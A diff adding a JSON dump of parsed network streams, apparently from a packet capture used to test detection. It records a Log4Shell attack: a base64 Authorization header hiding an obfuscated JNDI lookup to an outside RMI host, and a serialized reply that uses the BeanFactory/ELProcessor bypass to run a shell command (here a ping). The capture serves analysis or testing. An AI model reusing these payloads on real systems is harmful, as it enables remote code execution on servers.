@@ -1,0 +1,277 @@
+{
+  "streams": [
+    {
+      "stream_key": "172.17.0.1:56876-172.17.0.4:8888-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_request.uri",
+          "payload": "/app/servlet"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://172.17.0.4:8888/app/servlet"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_header.host",
+          "payload": "172.17.0.4:8888"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_header.user_agent",
+          "payload": "python-requests/2.25.1"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_header.authorization",
+          "payload": "Basic YXR0YWNrZXI6JHske2xvd2VyOmp9JHt1cHBlcjpufSR7bG93ZXI6ZH0ke3VwcGVyOml9OiR7bG93ZXI6cn1tJHtsb3dlcjppfTovLzM0LjkxLjczLjM3OjEwOTkvZ3A5cGM3fQ=="
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 172.17.0.4:8888\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: python-requests/2.25.1\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept-Encoding: gzip, deflate\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: */*\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_header.request_line",
+          "payload": "Authorization: Basic YXR0YWNrZXI6JHske2xvd2VyOmp9JHt1cHBlcjpufSR7bG93ZXI6ZH0ke3VwcGVyOml9OiR7bG93ZXI6cn1tJHtsb3dlcjppfTovLzM0LjkxLjczLjM3OjEwOTkvZ3A5cGM3fQ==\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /app/servlet HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 4,
+          "time": 9.1e-05,
+          "timestamp_utc": "2021-12-21T17:47:47.813849000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /app/servlet HTTP/1.1\r\nHost: 172.17.0.4:8888\r\nUser-Agent: python-requests/2.25.1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nAuthorization: Basic YXR0YWNrZXI6JHske2xvd2VyOmp9JHt1cHBlcjpufSR7bG93ZXI6ZH0ke3VwcGVyOml9OiR7bG93ZXI6cn1tJHtsb3dlcjppfTovLzM0LjkxLjczLjM3OjEwOTkvZ3A5cGM3fQ==\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.4:58356-34.91.73.37:1099-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 6,
+          "time": 0.004761,
+          "timestamp_utc": "2021-12-21T17:47:47.818519000Z",
+          "position": "tcp_payload.text",
+          "payload": "R"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:1099-172.17.0.4:58360-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 15,
+          "time": 0.010679,
+          "timestamp_utc": "2021-12-21T17:47:47.824437000Z",
+          "position": "tcp_payload.text",
+          "payload": "N\u0000&49.147.204.35.bc.googleusercontent.com\u0000\u0000��"
+        },
+        {
+          "no": 21,
+          "time": 0.013693,
+          "timestamp_utc": "2021-12-21T17:47:47.827451000Z",
+          "position": "tcp_payload.text",
+          "payload": "Q��\u0000\u0005w\u000f\u0001\u0003��\u0004\u0000\u0000\u0001}�-е�sr\u0000*com.sun.jndi.rmi.registry.ReferenceWrapperTZ\u000e$����\u0002\u0000\u0001L\u0000\u0007wrappeet\u0000\u0018Ljavax/naming/Reference;t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000#java.rmi.server.UnicastRemoteObjectE\t\u0012\u0015��~1\u0002\u0000\u0003I\u0000\u0004portL\u0000\u0003csft\u0000(Ljava/rmi/server/RMIClientSocketFactory;L\u0000\u0003ssft\u0000(Ljava/rmi/server/RMIServerSocketFactory;t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u001cjava.rmi.server.RemoteServer�\u0019\u0007\u0012h�9�\u0002\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u001cjava.rmi.server.RemoteObject�a��\fa3\u001e\u0003\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxpw\u0012\u0000\u0010UnicastServerRefx\u0000\u0000\u0000\u0000ppsr\u0000\u001dorg.apache.naming.ResourceRef\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0002\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u001dorg.apache.naming.AbstractRef\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0002\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u0016javax.naming.Reference�ƞ���\t\u0002\u0000\u0004L\u0000\u0005addrst\u0000\u0012Ljava/util/Vector;L\u0000\fclassFactoryt\u0000\u0012Ljava/lang/String;L\u0000\u0014classFactoryLocationq\u0000~\u0000\u0012L\u0000\tclassNameq\u0000~\u0000\u0012t\u0000\"http://172.17.0.5:8180/#BypassByELxpsr\u0000\u0010java.util.Vectorٗ}[�;�\u0001\u0003\u0000\u0003I\u0000\u0011capacityIncrementI\u0000\felementCount[\u0000\u000belementDatat\u0000\u0013[Ljava/lang/Object;t\u0000\"http://172.17.0.5:8180/#BypassByELxp\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0005ur\u0000\u0013[Ljava.lang.Object;��X�\u0010s)l\u0002\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxp\u0000\u0000\u0000\nsr\u0000\u001ajavax.naming.StringRefAddr�K�<�\u0011��\u0002\u0000\u0001L\u0000\bcontentsq\u0000~\u0000\u0012t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u0014javax.naming.RefAddr�\u0007�\u00028�J\u0002\u0000\u0001L\u0000\baddrTypeq\u0000~\u0000\u0012t\u0000\"http://172.17.0.5:8180/#BypassByELxpt\u0000\u0005scopet\u0000\u0000sq\u0000~\u0000\u001ct\u0000\u0004authq\u0000~\u0000\"sq\u0000~\u0000\u001ct\u0000\tsingletont\u0000\u0004truesq\u0000~\u0000\u001ct\u0000\u000bforceStringt\u0000\u0006x=evalsq\u0000~\u0000\u001ct\u0000\u0001xt\u0001o\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"var os = java.lang.System.getProperty('os.name'); var cmd = 'ping -c 10 1.1.1.1'; var proc = null; os.toLowerCase().contains('win')? java.lang.Runtime.getRuntime().exec(['cmd.exe', '/C', cmd]) : java.lang.Runtime.getRuntime().exec(['/bin/bash', '-c', cmd]);\")pppppxt\u0000%org.apache.naming.factory.BeanFactorypt\u0000\u0014javax.el.ELProcessor"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.4:58360-34.91.73.37:1099-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 17,
+          "time": 0.010845,
+          "timestamp_utc": "2021-12-21T17:47:47.824603000Z",
+          "position": "tcp_payload.text",
+          "payload": "\u0000\n172.17.0.4\u0000\u0000�O"
+        },
+        {
+          "no": 24,
+          "time": 0.029902,
+          "timestamp_utc": "2021-12-21T17:47:47.843660000Z",
+          "position": "tcp_payload.text",
+          "payload": "R"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:1099-172.17.0.4:58362-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 33,
+          "time": 0.032612,
+          "timestamp_utc": "2021-12-21T17:47:47.846370000Z",
+          "position": "tcp_payload.text",
+          "payload": "N\u0000&49.147.204.35.bc.googleusercontent.com\u0000\u0000��"
+        },
+        {
+          "no": 40,
+          "time": 0.034715,
+          "timestamp_utc": "2021-12-21T17:47:47.848473000Z",
+          "position": "tcp_payload.text",
+          "payload": "Q��\u0000\u0005w\u000f\u0001\u0003��\u0004\u0000\u0000\u0001}�-е��sr\u0000*com.sun.jndi.rmi.registry.ReferenceWrapperTZ\u000e$����\u0002\u0000\u0001L\u0000\u0007wrappeet\u0000\u0018Ljavax/naming/Reference;t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000#java.rmi.server.UnicastRemoteObjectE\t\u0012\u0015��~1\u0002\u0000\u0003I\u0000\u0004portL\u0000\u0003csft\u0000(Ljava/rmi/server/RMIClientSocketFactory;L\u0000\u0003ssft\u0000(Ljava/rmi/server/RMIServerSocketFactory;t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u001cjava.rmi.server.RemoteServer�\u0019\u0007\u0012h�9�\u0002\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u001cjava.rmi.server.RemoteObject�a��\fa3\u001e\u0003\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxpw\u0012\u0000\u0010UnicastServerRefx\u0000\u0000\u0000\u0000ppsr\u0000\u001dorg.apache.naming.ResourceRef\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0002\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u001dorg.apache.naming.AbstractRef\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0002\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u0016javax.naming.Reference�ƞ���\t\u0002\u0000\u0004L\u0000\u0005addrst\u0000\u0012Ljava/util/Vector;L\u0000\fclassFactoryt\u0000\u0012Ljava/lang/String;L\u0000\u0014classFactoryLocationq\u0000~\u0000\u0012L\u0000\tclassNameq\u0000~\u0000\u0012t\u0000\"http://172.17.0.5:8180/#BypassByELxpsr\u0000\u0010java.util.Vectorٗ}[�;�\u0001\u0003\u0000\u0003I\u0000\u0011capacityIncrementI\u0000\felementCount[\u0000\u000belementDatat\u0000\u0013[Ljava/lang/Object;t\u0000\"http://172.17.0.5:8180/#BypassByELxp\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0005ur\u0000\u0013[Ljava.lang.Object;��X�\u0010s)l\u0002\u0000\u0000t\u0000\"http://172.17.0.5:8180/#BypassByELxp\u0000\u0000\u0000\nsr\u0000\u001ajavax.naming.StringRefAddr�K�<�\u0011��\u0002\u0000\u0001L\u0000\bcontentsq\u0000~\u0000\u0012t\u0000\"http://172.17.0.5:8180/#BypassByELxr\u0000\u0014javax.naming.RefAddr�\u0007�\u00028�J\u0002\u0000\u0001L\u0000\baddrTypeq\u0000~\u0000\u0012t\u0000\"http://172.17.0.5:8180/#BypassByELxpt\u0000\u0005scopet\u0000\u0000sq\u0000~\u0000\u001ct\u0000\u0004authq\u0000~\u0000\"sq\u0000~\u0000\u001ct\u0000\tsingletont\u0000\u0004truesq\u0000~\u0000\u001ct\u0000\u000bforceStringt\u0000\u0006x=evalsq\u0000~\u0000\u001ct\u0000\u0001xt\u0001o\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"var os = java.lang.System.getProperty('os.name'); var cmd = 'ping -c 10 1.1.1.1'; var proc = null; os.toLowerCase().contains('win')? java.lang.Runtime.getRuntime().exec(['cmd.exe', '/C', cmd]) : java.lang.Runtime.getRuntime().exec(['/bin/bash', '-c', cmd]);\")pppppxt\u0000%org.apache.naming.factory.BeanFactorypt\u0000\u0014javax.el.ELProcessor"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.4:58362-34.91.73.37:1099-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 36,
+          "time": 0.032707,
+          "timestamp_utc": "2021-12-21T17:47:47.846465000Z",
+          "position": "tcp_payload.text",
+          "payload": "\u0000\n172.17.0.4\u0000\u0000�O"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.4:8888-172.17.0.1:56876-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "http_request.uri",
+          "payload": "/app/servlet"
+        },
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://172.17.0.4:8888/app/servlet"
+        },
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 \\r\\n"
+        },
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-Type: text/plain;charset=utf-8\r\n"
+        },
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-Length: 30\r\n"
+        },
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Tue, 21 Dec 2021 17:47:47 GMT\r\n"
+        },
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "http_header.response_line",
+          "payload": "Keep-Alive: timeout=60\r\n"
+        },
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "http_header.response_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 44,
+          "time": 0.048273,
+          "timestamp_utc": "2021-12-21T17:47:47.862031000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 \r\nContent-Type: text/plain;charset=utf-8\r\nContent-Length: 30\r\nDate: Tue, 21 Dec 2021 17:47:47 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\nThis is the standard response\n"
+        }
+      ]
+    }
+  ]
+}
